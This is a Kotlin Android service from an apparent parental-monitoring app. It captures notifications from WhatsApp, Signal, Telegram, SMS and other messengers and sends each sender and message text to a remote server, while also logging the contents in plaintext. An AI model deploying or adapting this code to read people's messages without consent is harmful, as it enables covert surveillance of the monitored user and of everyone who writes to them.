package com.xixfamily.kids.service

import android.annotation.SuppressLint
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.xixfamily.kids.network.SocketManager
import com.xixfamily.kids.utils.PreferenceManager
import org.json.JSONObject

class SmsMonitorService : NotificationListenerService() {

    companion object {
        private const val TAG = "SmsMonitor"
        private var isRunning = false

        // Apps we want to monitor for messages
        private val MONITORED_APPS = listOf(
            "com.whatsapp",
            "com.whatsapp.w4b",
            "com.facebook.orca",
            "com.facebook.mlite",
            "com.instagram.android",
            "com.twitter.android",
            "com.tencent.mm",          // WeChat
            "com.skype.raider",
            "com.gg.telegram",
            "org.telegram.messenger",
            "com.google.android.apps.messaging",
            "com.android.mms",
            "com.android.messaging",
            "com.samsung.android.messaging",
            "com.google.android.talk",  // Google Chat
            "com.discord",
            "com.snapchat.android",
            "com.linecorp.LGLOBAL",
            "com.viber.voip",
            "com.signal"
        )

        fun isServiceRunning(): Boolean = isRunning
    }

    private lateinit var prefs: PreferenceManager

    override fun onCreate() {
        super.onCreate()
        prefs = PreferenceManager.getInstance(this)
        isRunning = true
        Log.d(TAG, "SMS/Chat monitor service created")
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        Log.d(TAG, "SMS/Chat monitor service destroyed")
    }

    @SuppressLint("NewApi")
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName

        // Check if this is a monitored messaging app
        if (!isMonitoredApp(packageName)) return

        // Only process if we have a socket connection
        if (!SocketManager.getInstance().isSocketConnected()) return

        try {
            val notification = sbn.notification
            val extras = notification.extras
            val appName = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                sbn.notification.extras.getString(
                    android.app.Notification.EXTRA_SUBSTITUTE_APP_NAME
                ) ?: getAppNameFromPackage(packageName)
            } else {
                getAppNameFromPackage(packageName)
            }

            val title = extras.getString(android.app.Notification.EXTRA_TITLE, "")
            val textContent = extras.getString(android.app.Notification.EXTRA_TEXT, "")
                ?: extras.getCharSequence(android.app.Notification.EXTRA_BIG_TEXT)?.toString()
                ?: ""

            // For messaging apps, the title is usually the sender
            val sender = title
            val message = textContent

            if (message.isNotEmpty()) {
                // Send SMS/chat log to server
                SocketManager.getInstance().emit("sms:log", JSONObject().apply {
                    put("sender", sender)
                    put("message", message)
                    put("appName", appName)
                    put("packageName", packageName)
                    put("type", "inbox")
                })

                // Also send as notification event for more detail
                SocketManager.getInstance().emit("notification:event", JSONObject().apply {
                    put("appName", appName)
                    put("title", title)
                    put("textContent", textContent)
                    put("packageName", packageName)
                })

                Log.d(TAG, "Captured message from $appName: $sender - $message")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing notification: ${e.message}")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // Not needed for monitoring
    }

    override fun onListenerConnected() {
        Log.d(TAG, "Notification listener connected")
        isRunning = true

        // Send initial notification about service being active
        if (SocketManager.getInstance().isSocketConnected()) {
            SocketManager.getInstance().emit("notification:event", JSONObject().apply {
                put("appName", "KidsFamily")
                put("title", "Monitor Aktif")
                put("textContent", "Pemantauan notifikasi aktif")
                put("packageName", packageName)
            })
        }
    }

    override fun onListenerDisconnected() {
        Log.d(TAG, "Notification listener disconnected")
        isRunning = false

        // Try to reconnect if we should be running
        if (prefs.isLoggedIn()) {
            // The system may disable us - request re-enable
            Log.d(TAG, "Listener disconnected while logged in - will need re-enable")
        }
    }

    private fun isMonitoredApp(packageName: String): Boolean {
        return MONITORED_APPS.any { packageName.contains(it, ignoreCase = true) }
    }

    private fun getAppNameFromPackage(packageName: String): String {
        return when {
            packageName.contains("whatsapp") -> "WhatsApp"
            packageName.contains("facebook") -> "Facebook"
            packageName.contains("instagram") -> "Instagram"
            packageName.contains("messaging") || packageName.contains("mms") -> "SMS"
            packageName.contains("telegram") -> "Telegram"
            packageName.contains("snapchat") -> "Snapchat"
            packageName.contains("discord") -> "Discord"
            packageName.contains("line") -> "LINE"
            packageName.contains("viber") -> "Viber"
            packageName.contains("signal") -> "Signal"
            packageName.contains("skype") -> "Skype"
            packageName.contains("twitter") -> "Twitter/X"
            packageName.contains("tencent") -> "WeChat"
            packageName.contains("google.android.talk") -> "Google Chat"
            packageName.contains("discord") -> "Discord"
            else -> packageName.substringAfterLast(".")
        }
    }
}
